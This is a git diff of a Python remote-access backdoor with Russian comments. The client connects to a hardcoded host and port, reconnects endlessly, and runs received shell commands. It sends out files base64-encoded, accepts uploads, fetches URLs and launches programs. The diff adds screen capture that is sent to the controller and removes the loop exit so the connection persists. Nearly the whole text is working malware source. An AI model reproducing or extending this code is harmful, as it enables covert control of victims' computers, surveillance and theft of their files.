@@ -9,6 +9,7 @@ import sys
 import winreg
 import base64 
 import requests
+from mss import mss
 
 #конвектирует данные пайтона в джейсон а его в свою очередь в байты
 def reliable_send(data,sock):
@@ -35,45 +36,59 @@ def download(url):
                 return f"[+] Файл {file_name} успешно скачан!"
         except Exception as e:
                 return f"[!!] Ошибка скачивания файла: {e}"
-        
+#Делает скриншот экрана        
+def screenshot():
+        try:
+                with mss() as sct:
+                        screenshot_file = sct.shot(output="screenshot.png")
+                with open(screenshot_file, "rb") as screen_file:
+                        return base64.b64encode(screen_file.read())
+        finally:
+                if os.path.exists("screenshot.png"):
+                        os.remove("screenshot.png")
 
 #получает файлы, команды, выполняет и потом отправляет результаты на сервер
 def shell(sock):
-        while True:
-                command = reliable_recv(sock)
-                if command == "q":
-                        break
-                elif command[:2] == "cd" and len(command) > 1:
-                        try:
-                                os.chdir(command[:3].strip())
-                                reliable_send(f"[+] Переход в директорию: {os.getcwd()}")
-                        except Exception as e:
-                                reliable_send(f"[!!] Ошибка: {e}")
-                elif command[:8] == "download":
-                        try:
-                                with open(command[9:], "rb") as file:
-                                        reliable_send(base64.b64encode(file.read()).decode(), sock)
-                        except FileNotFoundError:
-                                reliable_send("[!!] Файл не найден", sock) 
-                elif command[:6] == "upload":
-                        with open(command[7:], "wb") as file:
-                                data = reliable_recv(sock)
-                                try:
-                                        file.write(base64.b64decode(data))
-                                        reliable_send("[+] Файл успешно загружен", sock)
-                                except:
-                                        reliable_send(f"[!!] Ошибка загрузки файла: {e}", sock)
-
-                elif command[:3] == "get":
-                        result = download(command[4:])
-                        reliable_send(result, sock)
-                else:
-                        try:
-                                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin= subprocess.PIPE)
-                                result = proc.stdout.read() + proc.stderr.read()
-                                reliable_send(result.decode(errors="ignore"), sock)
-                        except Exception as e:
-                                reliable_send(f"[!!] Ошибка выполнения команды: {e}", sock)
+    while True:
+        command = reliable_recv(sock)
+        if command == "q":
+            break
+        elif command.startswith("cd"):
+            try:
+                os.chdir(command[3:])
+                reliable_send(f"[+] Переход в директорию: {os.getcwd()}", sock)
+            except Exception as e:
+                reliable_send(f"[!!] Ошибка: {e}", sock)
+        elif command.startswith("download"):
+            try:
+                with open(command[9:], "rb") as file:
+                    reliable_send(base64.b64encode(file.read()).decode(), sock)
+            except FileNotFoundError:
+                reliable_send("[!!] Файл не найден", sock)
+        elif command.startswith("upload"):
+            with open(command[7:], "wb") as file:
+                file_data = reliable_recv(sock)
+                file.write(base64.b64decode(file_data))
+        elif command.startswith("get"):
+            result = download(command[4:])
+            reliable_send(result, sock)
+        elif command.startswith("start"):
+            try:
+                subprocess.Popen(command[6:], shell=True)
+                reliable_send(f"[+] Файл {command[6:]} успешно запущен", sock)
+            except Exception as e:
+                reliable_send(f"[!!] Ошибка запуска файла: {e}", sock)
+        elif command.startswith("screenshot"):
+            screenshot_data = screenshot()
+            reliable_send(screenshot_data.decode(), sock)
+        else:
+            try:
+                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                result = proc.stdout.read() + proc.stderr.read()
+                reliable_send(result.decode(errors="ignore"), sock)
+            except Exception as e:
+                reliable_send(f"[!!] Ошибка выполнения команды: {e}", sock)
+                
 
 #повторное подключение
 def connection():
@@ -82,8 +97,7 @@ def connection():
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect(("192.168.178.67", 54321))
             shell(sock)
-            sock.close()
-            break  
+            sock.close() 
         except socket.error:
             time.sleep(5)
 
